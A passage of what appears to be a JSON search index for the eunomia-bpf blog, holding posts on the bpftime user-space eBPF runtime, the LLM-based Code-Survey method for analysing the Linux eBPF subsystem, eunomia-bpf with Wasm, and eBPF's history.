while the verifier restricts eBPF programs to ensure safety, this also limits the functionality expansion of eBPF; any new feature or improvement requires modifications to the kernel code. These limitations not only increase the maintenance difficulty of the system but also reduce the flexibility and universality of eBPF.</p> <p>For kernels without eBPF support (e.g., older systems) or applications in non-privileged containers, user-space eBPF runtimes are a viable alternative, allowing the execution of eBPF programs for tracing, analysis, and extension operations without kernel eBPF support.</p>"},{"location":"blog/2023/11/11/bpftime-extending-ebpf-from-kernel-to-user-space/#shortcomings-of-other-user-space-extension-solutions","title":"Shortcomings of Other User-Space Extension Solutions","text":"<p>Currently, there are other user-space tracing and extension solutions, such as gdb and other tools that use the ptrace mechanism for process tracing and analysis, Wasm, Lua virtual machines that can be used as plugin runtimes, and binary instrumentation tools like Frida for dynamic tracing in user space. However, these solutions have their own limitations.</p> <ul> <li><code>High Performance Overhead</code>: Traditional tools like gdb use the ptrace mechanism for process tracing. Although they are powerful, they introduce significant performance overhead when analyzing and interacting with other processes. This method frequently pauses and resumes the target process, leading to reduced efficiency. Additionally, ptrace limits the number of processes that can be traced simultaneously in the system, making large-scale distributed tracing infeasible. WebAssembly (Wasm) sandboxes, while offering good flexibility and cross-language support, require strict validation and runtime checks when executing external libraries or procedures, potentially introducing performance losses. In contrast, eBPF offers a more performance-centric strategy, using static analysis and a verifier to ensure safe execution of code on the host without additional runtime overhead. For bpftime, since it embeds the eBPF virtual machine in the function call context of the traced process without extra context switches, it has lower performance overhead.</li> <li><code>Security Issues</code>: Binary instrumentation tools like Frida provide dynamic tracing capabilities, but this can introduce security issues. The instrumentation code runs in the same process context and can be maliciously exploited. Additionally, code defects in the tracing tools or scripts themselves may cause the traced program to crash, such as accessing incorrect addresses or pointers. In contrast, eBPF can ensure the safety of code through its verifier.</li> <li><code>Insufficient Visibility</code>: Additionally, for other user-space tracing solutions, these tools typically only offer visibility into single processes and cannot provide system-wide insights. They struggle to capture a global view of kernel-level events or cross-process communications, limiting their analytical capabilities in complex systems. This is why eBPF and other solutions mainly perform tracing in kernel space, allowing for correlated analysis of kernel and user-space events, such as linking layer 7 network packets with kernel-level network events, or associating user-space function call behavior with kernel-level system calls, thus providing more comprehensive analytical capabilities. For bpftime, it can be more than just a user-space virtual machine solution. User-space eBPF can work in conjunction with kernel-space eBPF infrastructure to achieve boundary-crossing analysis and extension capabilities.</li> </ul> <p>For existing other user-space eBPF runtimes, as mentioned earlier, they lack dynamic tracing or extension capabilities, require manual integration, and cannot directly utilize existing eBPF toolchains and applications, which greatly limits their use cases. On the other hand, they cannot work directly with kernel-space eBPF, only offering limited user-space extension capabilities.</p>"},{"location":"blog/2023/11/11/bpftime-extending-ebpf-from-kernel-to-user-space/#bpftime-user-space-ebpf-runtime","title":"bpftime: User-Space eBPF Runtime","text":""},{"location":"blog/2023/11/11/bpftime-extending-ebpf-from-kernel-to-user-space/#user-space-ebpf-runtime-compatible-with-existing-ebpf-tools-and-frameworks","title":"User-Space eBPF Runtime Compatible with Existing eBPF Tools and Frameworks","text":"<p>bpftime aims to maintain good compatibility with existing kernel eBPF as a user-space alternative and improvement to kernel eBPF. It also seeks to maximize the use of the rich ecosystem and tools of existing eBPF. For example, bpftime allows the direct use of unmodified bpftrace tools to execute eBPF scripts in user space, tracing system calls or user-space functions:</p> <p></p> <p>At the same time, it can run user-space versions of BCC/libbpf-tools such as bashreadline, funclatency, gethostlatency, mountsnoop, opensnoop, sigsnoop, statsnoop, syscount, etc[7]. bpftime constructs eBPF map data structures in user-space shared memory, enabling the analysis and statistics of multiple processes, and supports reporting data to tracing tools through ring buffer, perf buffer, and other means.</p> <p>bpftime also provides eBPF infrastructure compatible with the kernel in user-space. It can run without needing kernel eBPF and supports some of the kernel's eBPF maps, helpers, dynamic tracing mechanisms, and almost all eBPF instruction sets:</p> <p></p> <p>From a security perspective, bpftime provides an eBPF verifier to ensure the safety of eBPF bytecode, preventing malicious code injection or damaging the traced process. bpftime can use the kernel's eBPF verifier or an independent user-space eBPF verifier as an alternative for environments without access to kernel eBPF.</p>"},{"location":"blog/2023/11/11/bpftime-extending-ebpf-from-kernel-to-user-space/#high-performance-uprobe-and-system-call-tracing","title":"High-Performance Uprobe and System Call Tracing","text":"<p>bpftime supports Uprobe and system call tracing by embedding eBPF programs into the function call context of the traced process through binary rewriting, thus achieving dynamic tracing and extension. This method not only avoids context switching between kernel and user spaces but also collects key data for performance analysis and fault diagnosis without modifying code, recompiling, or restarting processes. Compared to kernel Uprobe, bpftime's Uprobe implementation is more performant and offers more functionalities, such as modifying function return values or altering function execution flows, enabling code extension, hot patching, and defect injection. The performance of user-space Uprobe implemented by bpftime can be an order of magnitude higher than that of kernel Uprobe:</p> Probe/Tracepoint Types Kernel (ns) Userspace (ns) Uprobe 3224.172760 314.569110 Uretprobe 3996.799580 381.270270 Syscall Trace 151.82801 232.57691 <p>Using dynamic library injection implemented via ptrace and technologies like LD_PRELOAD, bpftime's eBPF runtime supports tracing during program startup and also allows mounting eBPF probes directly onto multiple running processes. We conducted a test where a probe monitoring the malloc function in libc was loaded using bpftime, and the loading latency was measured. The results showed that bpftime caused the running process to pause for about 48 milliseconds during loading. For comparison, we used the LD_PRELOAD method to load the same extension before the process started and observed a loading latency of 30 milliseconds.</p> <p>We used the sslsniff tool[8] to trace and analyze SSL encrypted traffic of Nginx in bpftime's user-space Uprobe and compared it with the kernel Uprobe approach, observing a significant performance improvement:</p> <p></p> <p>For modern eBPF observability tools, it may be necessary to collect and analyze the same event in both kernel and user-space functions. For instance, an HTTP request might require analyzing both kernel-level network events and user-space function calls to obtain a complete request chain. bpftime's Uprobe implementation can work in conjunction with kernel eBPF kprobes, enabling this kind of cross-boundary analysis capability. Implementing and improving other dynamic tracing mechanisms are also part of our plan.</p>"},{"location":"blog/2023/11/11/bpftime-extending-ebpf-from-kernel-to-user-space/#new-ebpf-jit-and-aot-compilers","title":"New eBPF JIT and AOT Compilers","text":"<p>bpftime includes a new LLVM-based eBPF JIT compiler that compiles eBPF bytecode into native machine code at runtime, thereby improving the execution efficiency of eBPF programs. Compared to other user-space eBPF runtime JIT compilers like ubpf and rbpf, and Wasm, the LLVM JIT compiler offers better performance, approaching the efficiency of native code execution. It also provides better cross-platform support, for example, supporting architectures like RISC-V. We conducted a simple performance comparison and analysis[9]:</p> <p></p> <p>In addition to JIT, bpftime also includes an AOT compiler, which allows eBPF bytecode to be pre-compiled into machine code files for specific architectures after verification. This can be particularly useful for deployment and use in embedded systems, significantly reducing the time for compilation at startup.</p>"},{"location":"blog/2023/11/11/bpftime-extending-ebpf-from-kernel-to-user-space/#more-exploratory-use-cases-and-future-developments","title":"More Exploratory Use Cases and Future Developments","text":"<p>Beyond extending previous Uprobe and system call tracepoints, bpftime can also be used for other exploratory use cases, such as:</p> <ul> <li><code>Fault Injection</code>: Using the kernel-compatible bpf_override_return() helper[10], bpftime can modify the Syscall return values of processes, block specific Syscalls, or modify and replace specific function calls in certain types of eBPF programs. This enables fault injection capabilities. Kernel Uprobe itself does not support this functionality, and kernel's <code>bpf_override_return</code> also requires enabling the CONFIG_BPF_KPROBE_OVERRIDE option at compile time for security reasons, which is not enabled by default in mainstream Linux distributions.</li> <li><code>Hot Patching</code>: As mentioned earlier, using the bpf_override_return helper mechanism, user-space eBPF can also replace or filter certain function calls, thus enabling hot patching capabilities.</li> <li><code>eBPF-based Nginx Module</code>: bpftime can be used as an Nginx Module to implement extensions in Nginx through eBPF, such as dynamic routing, load balancing, caching, security policies, etc., in Nginx.</li> <li><code>Enhancing Fuse</code>: There have been attempts to optimize Fuse using eBPF in the kernel. bpftime could also be used as part of a user-space filesystem, modifying the behavior of system calls in the corresponding user-space process through eBPF, enabling filesystem extensions such as dynamic routing, caching, security policies, etc., in user-space filesystems.</li> </ul> <p>bpftime is currently an early-stage exploratory project. We are actively exploring more potential application scenarios, such as implementing eBPF-based network packet filtering in user space, optimizing packet forwarding performance for service meshes, bypassing the kernel's network protocol stack, and more. We look forward to more ideas and suggestions from everyone, or working together to implement these functions. In the future, we also hope that bpftime can offer better compatibility support for the kernel and, with the help of LLVM's JIT compiler, provide better performance optimization guidance, and a more convenient testing and debugging</p>"},{"location":"blog/2023/11/11/bpftime-extending-ebpf-from-kernel-to-user-space/#conclusion","title":"Conclusion","text":"<p>bpftime opens up new possibilities for eBPF applications in user space and provides new options for extending user-space applications. It allows existing eBPF applications to run in non-privileged user space using the same libraries and toolchains, and offers tracing mechanisms like Uprobe and Syscall for user-space eBPF. Compared to kernel Uprobe, it significantly improves performance and does not require manual code instrumentation or process restarts. The runtime supports inter-process eBPF maps in user-space shared memory, and is also compatible with kernel eBPF maps, allowing seamless operation with the kernel eBPF infrastructure.</p> <p>bpftime is now open source on GitHub, and everyone is welcome to try it out and provide feedback: https://github.com/eunomia-bpf/bpftime If you have any suggestions or questions, feel free to raise an issue on GitHub or contact us by email at yunwei356@gmail.com.</p> <ul> <li>Slides: https://eunomia.dev/bpftime/documents/userspace-ebpf-bpftime-lpc.pdf</li> <li>Hack news: https://news.ycombinator.com/item?id=38268958</li> <li>arxiv: https://arxiv.org/abs/2311.07923</li> </ul>"},{"location":"blog/2023/11/11/bpftime-extending-ebpf-from-kernel-to-user-space/#references","title":"References","text":"<ol> <li>bpftime Git repo: https://github.com/eunomia-bpf/bpftime</li> <li>bpftime Linux Plumbers talk: https://lpc.events/event/17/contributions/1639/</li> <li>ubpf: https://github.com/iovisor/ubpf</li> <li>rbpf: https://github.com/qmonnet/rbpf</li> <li>Performance comparison of uprobe and kprobe: https://dl.acm.org/doi/10.1145/3603269.3604823</li> <li>Capturing Opening Files and Filter with Global Variables: https://eunomia.dev/tutorials/4-opensnoop/</li> <li>examples: https://github.com/eunomia-bpf/bpftime/tree/master/example</li> <li>sslsniff, based on the tool of the same name in bcc: https://github.com/eunomia-bpf/bpftime/tree/master/example/sslsniff</li> <li>bpf benchmark: https://github.com/eunomia-bpf/bpf-benchmark</li> <li>BPF-based error injection for the kernel: https://lwn.net/Articles/740146/</li> <li>FUSE BPF: A Stacked Filesystem Extension for FUSE: https://lwn.net/Articles/915717/</li> </ol> <p>Share on  Share on </p>"},{"location":"blog/2024/10/01/can-llms-understand-linux-kernel-a-new-ai-powered-approach-to-understanding-large-codebases/","title":"Can LLMs understand Linux kernel? A New AI-Powered Approach to Understanding Large Codebases","text":"<p>Ever tried diving into a massive codebase like the Linux kernel and felt like you were swimming in an ocean of code with no land in sight? Trust me, you're not alone. Understanding large, complex, and constantly evolving codebases is like trying to read a never-ending novel that's being written by thousands of authors simultaneously. It's overwhelming, to say the least.</p> <p>See our arxiv and GitHub repository for more details!</p> <p>The Struggle with Massive Codebases</p> <p>Traditionally, developers have relied on methods like static code analysis, manual code reviews, and poring over documentation to make sense of big projects. While these methods can be helpful, they're often time-consuming, tedious, and frankly, not very effective when dealing with the sheer size and complexity of modern software systems.</p> <p>You might be thinking, \"Why not use AI to read and understand the entire codebase?\" Well, here's the catch: even the most advanced Large Language Models (LLMs) have limitations. They can't process an entire massive codebase in one go due to context length restrictions. Techniques like Retrieval Augmented Generation (RAG) or fine-tuning models on specific datasets can help with specific functions or code snippets but fall short when it comes to capturing the broader picture of how a massive system evolves over time.</p> <p>Why Can't We Just Use RAG or Fine-Tuning?</p> <p>Great question! Let's break it down:</p> <ul> <li> <p>Retrieval Augmented Generation (RAG): This technique involves fetching relevant documents to help the AI generate responses. But with a codebase as vast as the Linux kernel, it's like trying to find all the needles in a haystack the size of a skyscraper. It's impractical to retrieve and process all the necessary documents to get a comprehensive understanding.</p> </li> <li> <p>Fine-Tuning: Fine-tuning an AI model on a specific dataset helps it understand that data better. However, it requires substantial resources, and the model still can't process the entire context of a massive codebase simultaneously. Plus, codebases evolve rapidly, so the model would need constant retraining to stay up-to-date.</p> </li> </ul> <p>The Core Problem</p> <p>Understanding not just the code but the evolution of a codebase\u2014why certain decisions were made, how features have changed, and where potential issues lie\u2014is incredibly challenging. The unstructured nature of development artifacts like commit messages, code reviews, and mailing list discussions adds another layer of complexity. These sources contain invaluable insights into the reasoning behind changes, but they're difficult to analyze systematically because they're, well, unstructured.</p> <p>Enter Code-Survey</p> <p>We're excited to introduce Code-Survey, a novel AI-powered methodology we've developed to tackle this exact problem. Instead of trying to cram an entire codebase into an AI model (which, trust us, doesn't work), Code-Survey takes a different approach.</p> <p>So, What's the Big Idea?</p> <p>Code-Survey leverages LLMs in a new way. We treat the AI as if it's a human participant in a survey. Think of it as conducting a massive questionnaire where the AI reads through unstructured data\u2014like commit messages, code diffs, and emails\u2014and answers specific, carefully designed questions. This method transforms messy, unstructured information into clean, structured datasets that we can actually analyze.</p> <p>Why This Approach Works</p> <p>By framing the problem as a survey, we're playing to the strengths of AI language models. They're great at understanding and generating human-like text but struggle with processing enormous amounts of code all at once. This method allows us to extract meaningful insights without overloading the AI or losing important context. It's like having an army of junior developers summarizing and categorizing information for you, but faster and without the coffee breaks!</p> <p>Understanding Codebases Before Code-Survey</p> <p>Before Code-Survey, making sense of large codebases was a daunting task. Developers would manually sift through code, comb through commit histories, and read endless documentation and mailing list archives. This was not only time-consuming but also prone to human error. Answering high-level questions like \"Why was this feature added?\" or \"How has this component evolved over time?\" was nearly impossible without dedicating significant resources.</p> <p>Applying Code-Survey to the Linux eBPF Subsystem</p> <p>To put Code-Survey to the test, we applied it to the Linux kernel's Extended Berkeley Packet Filter (eBPF) subsystem. For those unfamiliar, eBPF is like the Swiss Army knife of the Linux kernel, enabling advanced networking, observability, and security functionalities without changing kernel source code.</p> <p>Why eBPF?</p> <ul> <li>Complexity: eBPF has evolved rapidly, with countless features added over the years, making it a perfect candidate to showcase Code-Survey's capabilities.</li> <li>Unstructured Data: There's a wealth of information hidden in commits, code reviews, and mailing lists that hasn't been systematically analyzed.</li> <li>Impact: Understanding eBPF's evolution can lead to improvements in performance, security, and reliability for the countless systems that rely on it.</li> </ul> <p>What We Discovered</p> <p>Using Code-Survey, we analyzed over 16,000 commits and 150,000 emails related to eBPF development. Here are some of the insights we gained:</p> <ul> <li> <p>Feature Evolution: We mapped out how features like <code>bpf_link</code> (which provides a new abstraction for attaching programs to events) have developed over time. Surprisingly, despite being in the codebase for years, some features haven't received much attention outside of kernel developer circles.</p> </li> <li> <p>Bug Patterns: We identified which components and files in the Linux kernel have the highest frequency of bugs. Interestingly, while much focus has been on the verifier and JIT compiler, a significant number of bugs stem from eBPF's interactions with other kernel subsystems.</p> </li> <li> <p>Development Trends: We observed shifts in development focus over the years, such as a move from adding new features to improving stability and performance.</p> </li> <li> <p>Feature Interdependencies: We uncovered dependencies between features and components, providing insights into how new feature introductions impact the stability and performance of existing kernel components.</p> </li> </ul> <p>Core Concepts: The Survey Methodology</p> <p>The central principle behind Code-Survey is treating LLMs as human participants, acknowledging that software development is also a social activity. By carefully designing surveys, Code-Survey transforms unstructured data\u2014like commits and emails\u2014into organized, structured, and analyzable datasets.</p> <p></p> <p>Here's how it works:</p> <ol> <li> <p>Survey Design: We (or the AI) design surveys with specific questions targeting the information we want to extract. For example:</p> </li> <li> <p>\"What is the main purpose of this commit?\"</p> </li> <li>\"Which eBPF components are affected?\"</li> <li> <p>\"Is this a bug fix, a new feature, or a performance optimization?\"</p> </li> <li> <p>AI Processing: The AI reads through the unstructured data and answers the survey questions, effectively structuring the data.</p> </li> <li> <p>Validation: Human experts review samples of the AI's responses to ensure accuracy. If there are issues, we refine the survey or the AI's approach.</p> </li> <li> <p>Analysis: With structured data in hand, we perform quantitative analyses to uncover trends, patterns, and areas needing attention.</p> </li> </ol> <p>Why This Matters</p> <p>This approach allows us to answer questions that were previously nearly impossible to tackle, such as:</p> <ul> <li>\"How do new feature introductions impact the stability of existing components?\"</li> <li>\"Are there identifiable phases in the lifecycle of a feature?\"</li> <li>\"Which components have the highest bug frequency?\"</li> </ul> <p>Benefits of Code-Survey</p> <ul> <li> <p>Scalable Analysis: We can process thousands of commits and discussions quickly, something unfeasible with manual methods.</p> </li> <li> <p>Deep Insights: By structuring the data, we can perform analyses that weren't possible before, uncovering hidden patterns and trends.</p> </li> <li> <p>Versatility: The methodology is flexible and can be applied to other large codebases beyond the Linux kernel.</p> </li> </ul> <p>Best Practices We've Learned</p> <ul> <li> <p>Careful Survey Design: The quality of insights depends on well-designed questions. They should be clear, specific, and aligned with the AI's capabilities.</p> </li> <li> <p>Use Predefined Categories: This helps maintain consistency in the AI's responses and reduces ambiguity.</p> </li> <li> <p>Allow for Uncertainty: Letting the AI say \"I'm not sure\" prevents inaccurate information when the data is insufficient.</p> </li> <li> <p>Iterative Refinement: Continuously refining survey questions and validating responses improves accuracy over time.</p> </li> </ul> <p>Limitations to Keep in Mind</p> <ul> <li> <p>Data Quality Matters: Incomplete or unclear commit messages can affect the AI's ability to provide accurate answers.</p> </li> <li> <p>AI Isn't Perfect: Sometimes, the AI might misinterpret data or generate plausible but incorrect information.</p> </li> <li> <p>Human Oversight Needed: Experts are essential for designing surveys and validating results, ensuring the AI's outputs are reliable.</p> </li> </ul> <p>What's Next for Code-Survey?</p> <p>We're excited about the potential of applying Code-Survey to other massive projects like Kubernetes, Apache, or even proprietary codebases. We also plan to incorporate additional data sources, such as actual code changes, execution traces, and performance metrics, to gain even deeper insights.</p> <p>Join Us on This Journey</p> <p>We believe Code-Survey represents a significant leap forward in how we understand and maintain large codebases. By combining the power of AI with thoughtful survey design, we're unlocking insights that were previously hidden in plain sight.</p> <p>Want to Get Involved?</p> <p>Code-Survey is open-source! Check out our GitHub repository to explore the code, access the datasets, and contribute to the project. Whether you're a developer, researcher, or just curious, we welcome your feedback and collaboration.</p> <p>For updates on Code-Survey and our other projects, follow us on GitHub and join the conversation. Together, we can make navigating massive codebases less daunting and more efficient.</p> <p>References:</p> <ul> <li>eBPF Intro: What is eBPF?</li> <li>eBPF Tutorial: bpf-developer-tutorial</li> <li>Code-Survey GitHub Repository: github.com/eunomia-bpf/code-survey</li> </ul> <p>Feel free to reach out with any questions or comments. Let's revolutionize how we understand and work with large codebases together!</p> <p>Share on  Share on </p>"},{"location":"blog/2023/01/11/eunomia-bpf-looking-forward-to-2023-let-ebpf-sprout-wings-with-wasm/","title":"eunomia-bpf: Looking forward to 2023, let eBPF sprout wings with Wasm","text":"<p>Looking back at 2022, two technologies have received a lot of attention: eBPF and WebAssembly.</p>"},{"location":"blog/2023/01/11/eunomia-bpf-looking-forward-to-2023-let-ebpf-sprout-wings-with-wasm/#ebpf-new-possibilities","title":"eBPF: New Possibilities","text":"<p>eBPF is a revolutionary technology that originated in the Linux kernel and allows sandbox programs to run in the kernel of an operating system. It is used to securely and efficiently extend the functionality of the kernel without changing its source code or loading kernel modules.</p> <p>In the past year, observability technology has received significant attention and has been listed by Gartner as one of the top ten strategic technology trends for 2023. eBPF itself is a great complement to traditional observability capabilities. Without invasive modifications to the kernel, it dynamically inserts its own code into the kernel to achieve various monitoring and tracing capabilities. At the same time, eBPF has also promoted the development of a new generation of tools in areas such as networking, security, application configuration tracking, and performance troubleshooting. These tools no longer rely on existing kernel functionality, but actively re-run without affecting execution efficiency or security.</p> <p>Today, eBPF is widely used in cloud native, observability, performance optimization, security, hardware acceleration, and other fields. Its application scenarios are rapidly expanding, and innovative projects based on eBPF technology are emerging. For the operating systems community, eBPF technology brings a whole new realm of possibilities and opportunities. The era of eBPF has arrived.</p> <p>Looking back at the eBPF Summit 2022, \"The future of eBPF in the Linux Kernel\" outlined the development direction of eBPF-related technologies. The specific evolution path may include the following aspects:</p> <ul> <li>More comprehensive programming semantic support: The current programming capabilities of eBPF have some limitations (such as the lack of support for variable-bound loops and limited instruction counts). In the future, it is hoped to further provide Turing-complete programming capabilities for eBPF, enhancing its abilities in looping, memory allocation, and other language features.</li> <li>Stronger security: Support type safety, enhance runtime verifier, hope that BPF can provide security programming capabilities comparable to Rust, and explore the possibility of combining Rust and BPF features to provide further kernel functionality that is both portable and secure.</li> <li>Broader portability: Enhance CO-RE, strengthen the portability of helper interfaces, and realize cross-architecture and cross-platform portability.</li> <li>Stronger kernel programmability: Support access/modification of any kernel parameters and return values, achieve stronger kernel programming capabilities, and even use BPF to help build and enhance kernel security.</li> </ul>"},{"location":"blog/2023/01/11/eunomia-bpf-looking-forward-to-2023-let-ebpf-sprout-wings-with-wasm/#wasm-leading-the-next-generation-computing-paradigm","title":"Wasm: Leading the next generation computing paradigm","text":"<p>While eBPF primarily focuses on the kernel space or kernel-related applications, WebAssembly (Wasm) in the user space also became a new focus in 2022.</p> <p>WebAssembly, abbreviated as Wasm, is a technology with great potential from its inception. Initially designed as a portable bytecode-like instruction format standard for compiling high-level languages such as C/C++/Rust, it enables client and server applications to be deployed in web browsers. To this day, WebAssembly is evolving beyond the two domains indicated by its name, Web and Assembly. By using runtime environments compatible with Wasm, Wasm files can be executed on both the client and server sides. It has covered almost all emerging fields, from being dubbed the \"JavaScript killer\" to being considered the next frontiers of cloud computing. It has also made its way from cloud computing and serverless to edge computing. Wasm has far surpassed its role as the fourth web standard language and has redefined the development model of application software, gradually approaching its vision of \"write once, run anywhere.\"</p> <p>Wasm has several key design goals that have attracted attention since its inception:</p> <ul> <li>Portability: Wasm is designed to target low-level virtual machine architectures. Its instructions are translated into machine code by the physical machine separately. This means that Wasm binary files can ultimately run on various operating systems and chip architectures, whether in browsers running on X86 laptops or on servers inside or in the cloud, on mobile devices, IoT devices, and so on.</li> <li>Multi-language: Since Wasm is a compilation target, the specific language used for programming modules is not important. What matters is whether there is support for compiling that language into Wasm. Developers can flexibly use a variety of languages (such as C, C++, Rust, Ada, etc.) to build binary files and enjoy the benefits of Wasm.</li> <li>Lightweight and efficient: As a low-level binary instruction format, Wasm requires fewer operations to translate it into optimized machine code.</li> <li> <p>Security: One of the goals of Wasm is security. It executes in a sandbox environment with no initial visibility into the host runtime. This means that access to system resources (such as the file system and hardware) is restricted unless corresponding functions are explicitly imported to support it. Thus, Wasm greatly limits the attack surface and enables the secure execution of untrusted code in a multi-tenant environment.In the past year of 2022, Wasm has achieved many exciting accomplishments.  Many new Wasm startups have emerged, and established cloud service providers and companies have announced their support for Wasm.  The Bytecode Alliance has introduced many new Wasm standards and CNCF has hosted two WasmDay events.  One of the largest users of Wasm, Figma, was acquired by Adobe for an astonishing $20 billion.  For WebAssembly, 2023 is likely to be another breakout year:</p> </li> <li> <p>The component model describes how Wasm binary files interact with each other and is rapidly maturing with reference implementations already available.  Developers can declare which components their applications need, or more abstractly, which functionalities their applications require (rather than searching for libraries in their preferred source language).  Then the Wasm runtime can assemble the correct set of components on behalf of the user.  2023 will be the year when the component model starts to redefine how we write software.</p> </li> <li>Wasm has changed the potential of serverless environments.  Due to almost instantaneous startup time, smaller binary file size, and platform and architecture neutrality, Wasm binary files can be executed with a fraction of the resources required by today's serverless infrastructure.</li> <li>At the end of 2022, the OCI Registry working group announced an official way to store content other than container images.  This could include Helm charts, photos, or Wasm applications.  This new feature is called \"Artifact Storage.\"</li> <li>All major programming languages will be supported by Wasm: The Wasm GC proposal is likely to be available and supported in early 2023, so Kotlin and Dart will soon release Wasm compilers, and Java is also likely to become the most popular Wasm development language.</li> </ul>"},{"location":"blog/2023/01/11/eunomia-bpf-looking-forward-to-2023-let-ebpf-sprout-wings-with-wasm/#coolbpf-eunomia-bpf-eunomia-lcc","title":"Coolbpf + eunomia-bpf = eunomia-lcc","text":"<p>In the past year, Alibaba Cloud Dragon Lizard Community Operations SIG officially open-sourced the Coolbpf project.  Based on CO-RE (Compile Once-Run Everywhere), Coolbpf retains advantages such as low resource consumption and strong portability, and incorporates dynamic compilation features of BCC, greatly simplifying the development, compilation, and runtime efficiency through remote service capabilities, and is suitable for deploying applications in production environments in batches.  Coolbpf also supports running on low kernel versions without eBPF features by providing an eBPF driver, ensuring safe operation on low versions from both kernel space and the perspective of batch deployment, and greatly enhancing the ability of eBPF programs to \"compile once, run everywhere.\"</p> <p>eunomia-bpf is also a universal, lightweight, multi-language next-generation eBPF development framework/component library combined with Wasm.  It was initiated and incubated in the Alibaba Cloud Dragon Lizard Community's \"eBPF Technology Exploration SIG\" in the second half of 2022.  eunomia-bpf includes a runtime and a toolchain and focuses on improving the development and usage experience of eBPF programs in user space.  It has three main features:</p> <ol> <li>Only kernel space code needs to be written to run eBPF programs.  The kernel space frontend is fully compatible with various syntaxes such as bcc and native libbpf, reducing the learning cost and improving development efficiency for eBPF.</li> <li>The compilation toolchain and the runtime are completely separated, ensuring compatibility between different versions of the compilation toolchain and the runtime.  They are loaded in the CO-RE manner (compile once, run everywhere), reducing resource consumption for deployment and usage.  It also allows code similar to BCC/bpftrace to support AOT compilation without relying on libraries like llvm at runtime, while retaining the simplicity of bpftrace-like scripting usage.</li> <li>User space also supports multiple languages, such as C++/C/Rust, for developing eBPF programs with Wasm.  The user space programs can be distributed and dynamically loaded as Wasm modules or as JSON/YAML configuration files.  They can also be stored and managed as Wasm OCI images, which can include user space and kernel space eBPF applications.</li> </ol> <p>eunomia-bpf hopes to provide a framework in the form of libraries or loosely coupled components to explore more in compiling, building, distributing, and running eBPF programs, making it easier for other companies and individuals to build a similar user space development and runtime environment, or a complete development platform and plugin runtime, based on their own kernel space eBPF infrastructure.</p> <p>At the end of 2022, we attempted to combine Coolbpf and eunomia-bpf to create a new eBPF user space development library eunomia-lcc.  With the support of low kernel versions provided by Coolbpf and the ability to deploy applications in batches, as well as the user space development and distribution features provided by eunomia-bpf combined with Wasm, we created a new eBPF user space development library within the framework of Coolbpf.  With eunomia-lcc, Coolbpf can now:</p> <ul> <li>Automatically retrieve kernel space export information, generate command-line parameters, histogram outputs, etc., by only writing kernel space code when writing eBPF programs or tools.</li> <li>Use Wasm for developing user space interactive programs, control the loading and execution of the entire eBPF program, and process data reported by eBPF within the Wasm virtual machine.- Precompiled eBPF programs can be packaged as universal JSON or Wasm modules for distribution across architectures and kernel versions without the need for recompilation and can be dynamically loaded and executed.</li> </ul> <p>At the same time, Coolbpf features such as low version compatibility, automatic BTF acquisition, remote compilation, etc. can be preserved, making eBPF program development more convenient.</p> <p>Looking ahead, the eunomia-bpf team also hopes to explore, improve, and enhance the process, tools, SDK for eBPF program development, compilation, packaging, publishing, installation, and upgrading in 2023. They actively provide feedback to the upstream community to further enhance the programming experience and language capabilities of eBPF. They also aim to combine it further with WebAssembly, exploring and practicing more in terms of observability, serverless, programmable kernel, etc., moving towards Turing completeness and better language support.</p>"},{"location":"blog/2023/01/11/eunomia-bpf-looking-forward-to-2023-let-ebpf-sprout-wings-with-wasm/#references","title":"References","text":"<ol> <li>Wasm will lead the next generation of computing paradigms (Translated): https://www.oschina.net/news/214580</li> <li>WebAssembly: 5 predictions for 2023: https://www.sohu.com/a/626985661_121119003</li> <li>eBPF Technology Research SIG Homepage: https://openanolis.cn/sig/ebpfresearch</li> <li>Coolbpf Project Repository: https://gitee.com/anolis/coolbpf</li> <li>eunomia-bpf Dragon Lizard Community Mirror Repository: https://gitee.com/anolis/eunomia</li> <li>eunomia-bpf Github Repository: https://github.com/eunomia-bpf/eunomia-bpf</li> <li>When Wasm meets eBPF: Writing, distributing, loading, and running eBPF programs with WebAssembly | Dragon Lizard Technology: https://developer.aliyun.com/article/1050439</li> <li>2023, will observability requirements have an \"explosive year\"? https://36kr.com/p/dp2063589382737542</li> </ol> <p>Share on  Share on </p>"},{"location":"blog/2024/06/11/the-ebpf-evolution-and-future-from-linux-origins-to-cross-platform-dominance/","title":"The eBPF Evolution and Future: From Linux Origins to Cross-Platform Dominance","text":"<p>eBPF (Extended Berkeley Packet Filter) has become a revolutionary force in operating system kernel programming since its inception. Initially created for network packet filtering, eBPF has evolved into a versatile kernel extension tool, supporting system monitoring, performance analysis, security policy enforcement, and more. As the technology has advanced, eBPF has gained widespread adoption not only on Linux platforms but also on other operating systems like Windows and macOS, showing significant potential as a cross-platform infrastructure technology. In this context, eBPF is driving the evolution of modern operating system architectures, opening new possibilities for cloud-native infrastructure and platform engineering.</p>"},{"location":"blog/2024/06/11/the-ebpf-evolution-and-future-from-linux-origins-to-cross-platform-dominance/#11-the-growth-and-evolution-of-the-ebpf-ecosystem","title":"1.1 The Growth and Evolution of the eBPF Ecosystem","text":"<p>As the application scope of eBPF expands, developers are exploring its integration with other emerging technologies to further unlock its potential. Among these, the combination of eBPF with large language models (LLMs) and WebAssembly (Wasm) has gained significant attention. These innovative integrations not only introduce new use cases for eBPF but also elevate its standing within cloud-native technologies.</p>"},{"location":"blog/2024/06/11/the-ebpf-evolution-and-future-from-linux-origins-to-cross-platform-dominance/#111-a-review-of-ebpfs-early-development-and-key-breakthroughs","title":"1.1.1 A Review of eBPF's Early Development and Key Breakthroughs","text":"<p>The origins of eBPF can be traced back to the need for increased programmability within the Linux kernel. Initially, BPF was merely a tool for network packet filtering. However, with the advancement of technology, eBPF has evolved into a general-purpose kernel extension technology. eBPF allows developers to dynamically adjust and extend kernel behavior without modifying the kernel code .</p> <p>The community and enterprise contributions have been instrumental in the development of eBPF. Companies like Meta and Google have not only contributed code to enhance eBPF's capabilities but also validated its feasibility in production environments at scale. Thanks to the efforts of these enterprises, eBPF has become an essential part of cloud-native architectures, playing a significant role in system performance optimization, network security, and observability.</p> <p>In modern computing environments, eBPF's applications in observability, networking, and security have significantly improved system performance and management efficiency. Specifically, eBPF can dynamically load and execute user-defined code to capture and analyze key data in real time during system operations. This capability makes eBPF particularly effective for monitoring system states, optimizing network transmission, and enhancing security measures.</p> <p>For instance, the Cilium project utilizes eBPF to build an efficient container networking solution that provides fine-grained security policies and network traffic control. Similarly, bpftrace, a powerful dynamic tracing tool, enables developers to easily write and run complex system performance analysis scripts . The rise of these open-source projects has brought widespread attention and adoption of eBPF technology within the developer 